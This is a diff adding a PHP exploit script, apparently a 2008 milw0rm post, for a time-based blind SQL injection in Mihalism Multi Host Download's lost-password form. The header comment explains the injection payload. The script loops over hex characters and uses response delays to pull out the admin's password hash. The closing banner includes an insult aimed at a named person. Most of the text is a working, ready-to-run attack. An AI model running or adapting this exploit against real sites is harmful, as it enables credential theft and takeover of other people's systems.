@@ -1,0 +1,126 @@
+<?php
+
+/*
+###############################################################################
+#                                                                             
+# Moubik ( Romanian Security Team - http://rstzone.org ) presents             
+#                                                                             
+# Mihalism Multi Host Download - Blind SQL Injection Attack                   
+#                                                                              
+# Thanks to Vladii for telling me about the CMS.                              
+# Thanks to Shocker for telling Vladii about the CMS.                         
+#                                                                             
+#                                                                             
+# Shoutz to Kw3rln, Bankai, Slick, Nemessis                                   
+# Visit http://rstzone.org                                                    
+# Visit http://websecurity.ro                                                 
+#                                                                             
+# Ride as high as possible                                                    
+#                                                                             
+#                                                                             
+# Vulnerable Code is everywhere.                                              
+# I'll talk about users.php                                                   
+#                                                                             
+###############################################################################* 
+
+We have the code 
+
+Line 107:
+$DB->query("SELECT * FROM `".SQL_USERS_TABLE."` WHERE `user_name` = '".$_POST['user_name']."'");
+
+Line 112:
+$DB->query("INSERT INTO `".SQL_USERS_TABLE."` VALUES('', '".$_POST['user_name']."', '".md5($_POST['user_pass_1'])."', '', '".$_SERVER['REMOTE_ADDR']."', '".$_POST['user_email']."', '".$_POST['private']."', '".time()."', 'NORMAL', '".$_POST['country']."', '".$dob."', '".$_POST['gender']."')");
+
+............
+
+I'll create the query for lost password.
+Click "Lost Password" and enter the SQL Injection in Username. The email address you could just leave it empty
+
+Injection:
+' UNION SELECT IF ( SUBSTRING(password,1,1) = '1', BENCHMARK(2000000, ENCODE('a','b')), 1 ),2,3,4,5,6,7,8,9,10,11,12 from mmh_user_data where user_id='1
+
+The password is saved in hashed form so you only search for 0..9, a..f and you have the admin's hash
+
+This vulnerable code is:
+$DB->query("SELECT * FROM `".SQL_USERS_TABLE."` WHERE `user_name` = '{$_POST['username']}'");
+
+So the query becomes:
+SELECT * FROM `mmh_user_data` WHERE `user_name` = '' UNION SELECT IF ( SUBSTRING(password,1,1) = '1', BENCHMARK(20000000, ENCODE('a','b')), 1 )
+,2,3,4,5,6,7,8,9,10,11,12 from mmh_user_data where user_id='1'
+
+Delay-ing the response if the first character of the admin's hash is equal to '1'
+
+*/
+
+function goto_help()
+{
+	echo "-----------------------------------------------------------------------------------------\n";
+	echo "* Usage php ". $argv[0] ." [full_link] [userid] \n";
+	echo "* example:\n";
+	echo "* php ". $argv[0] ." http://localhost/multihost/users.php?act=lost_password_go 1 \n";
+	echo "-----------------------------------------------------------------------------------------\n";
+	exit();
+}
+
+
+$chars = array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f');
+
+$host = $argv[1];
+$userid = (empty($argv[2]) == true ? 1 : $argv[2]);
+
+if (empty ($argv[1]))
+{
+	goto_help();
+}
+
+echo "---------------------------------------------------\n";
+echo "Starting to exploit $host\n";
+echo "Userid exploited is $userid\n";
+echo "---------------------------------------------------\n";
+
+$hash = "";
+
+$conn = curl_init();
+curl_setopt($conn, CURLOPT_POST, true);
+curl_setopt($conn, CURLOPT_URL, $host);
+curl_setopt($conn, CURLOPT_RETURNTRANSFER, true);
+
+for ($length = 1 ; $length <= 32 ; $length++)
+{
+	for ($char = 0 ; $char <= 16 ; $char++)
+	{
+		$query = "' UNION SELECT IF ( SUBSTRING(password,". $length .",1) = '". $chars[$char] ."', BENCHMARK(20000000, ENCODE('a','b')), 1 ),2,3,4,5,6,7,8,9,10,11,12 from mmh_user_data where user_id='". $userid;
+		//echo $query  ."\n";
+		$start = time(); $end = $start;
+		curl_setopt($conn, CURLOPT_POSTFIELDS, 'username='. urlencode($query) .'&user_email=1');
+		curl_exec( $conn );
+		$end = time();
+		
+		//if we have a hit
+		if (($end - $start) > 5) 
+		{
+			echo "possible hit for ". $chars[$char] ."\n";
+			$hash .= $chars[$char];
+			break;
+		}
+		else
+		{
+			echo $chars[$char]. " ";
+		}
+	}
+}
+
+
+echo "---------------------------------------------------\n";
+echo "* Exploit made by Moubik\n";
+echo "* Romanian Security Zone - http://rstzone.org/\n";
+echo "* esc6 esti un retardat\n";
+echo "---------------------------------------------------\n";
+echo "* Hash found for userid=". $userid . "\n";
+echo "* hash=". $hash . "\n";
+echo "---------------------------------------------------\n";
+
+
+?>
+
+# milw0rm.com [2008-02-06]
